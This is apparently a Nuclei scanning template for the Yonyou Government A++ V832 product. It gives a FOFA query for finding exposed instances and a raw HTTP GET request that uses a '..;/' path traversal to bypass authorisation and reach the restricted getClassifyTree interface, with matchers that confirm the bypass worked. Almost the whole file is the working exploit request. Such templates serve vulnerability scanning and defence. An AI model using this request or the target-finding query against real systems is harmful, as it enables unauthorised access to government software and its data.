id: yonyou-a-unauthorized

info:
  name: "用友政务A++V832接口路径遍历未授权访问"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/pf/portal/login/css/fonts/style.css"
      用友政务A++V832产品因安全验证机制缺失，攻击者可利用路径遍历技术绕过授权限制，直接访问受限接口。
  tags: 用友政务A++V832

http:
- raw:
  - |
    GET /pub/fe/config/..;/..;/..;/ga/riskClassify/getClassifyTree HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/web
    p,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'success'
